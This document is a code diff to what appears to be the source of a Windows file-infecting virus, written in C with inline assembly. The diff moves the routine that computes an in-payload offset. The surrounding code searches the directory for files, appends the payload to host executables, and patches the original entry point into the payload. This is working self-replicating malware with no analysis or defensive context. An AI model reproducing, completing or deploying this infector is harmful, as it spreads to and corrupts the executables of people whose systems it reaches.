@@ -126,19 +126,6 @@ void payload(void)
     task1_ret: asm("nop");
 #endif
 
-    //  calculating in-file offset of instruction mov /(rva)/, %%rax
-    DWORD offset = 0;
-    asm volatile(
-        "leal payload, %%eax\n\t"
-        "leal key_label, %%ebx\n\t"
-        "subl %%eax, %%ebx\n\t"
-        "movl %%ebx, %0\n\t"
-        :"=r" (offset)
-        :
-        :"eax", "ebx"
-    ); // get the offset of that mov instr
-    offset += 3; // get the offset of the addr in that instr
-
     // 
     CALL(infect);
     infect_ret: asm("nop");
@@ -212,13 +199,26 @@ task1: {
 
 // ===========================================
 char target[MAX_PATH] = {0};
-payload_info_t payload_info = {0}; // parameters for inject
+payload_info_t payload_info = {0}; 
+DWORD offset = 0; // parameters for inject
 
 infect: {
     asm ("nop");
 
     CALL(get_payload);
     get_payload_ret: asm("nop");
+
+    //  calculating in-file offset of instruction mov [rva], %%rax
+    asm volatile(
+        "leal payload, %%eax\n\t"
+        "leal key_label, %%ebx\n\t"
+        "subl %%eax, %%ebx\n\t"
+        "movl %%ebx, %0\n\t"
+        :"=r" (offset)
+        :
+        :"eax", "ebx"
+    ); // get the offset of that mov instruction
+    offset += 3; // get the offset of the addr in that instr
 
     WIN32_FIND_DATAA findFileData;
     char param[] = "*.*"; 
@@ -353,7 +353,6 @@ inject:{
     FUNCTION(fseek)(host, sect_end, SEEK_SET);
     // &AddressOfEntryPoint;
     FUNCTION(memcpy)(payload_info.payload + offset, &AddressOfEntryPoint, sizeof(DWORD));
-    // payload_info.payload[offset] = ;
     FUNCTION(fwrite)(payload_info.payload, 1, payload_info.size, host);
     FUNCTION(fclose)(host);
     RET(inject);
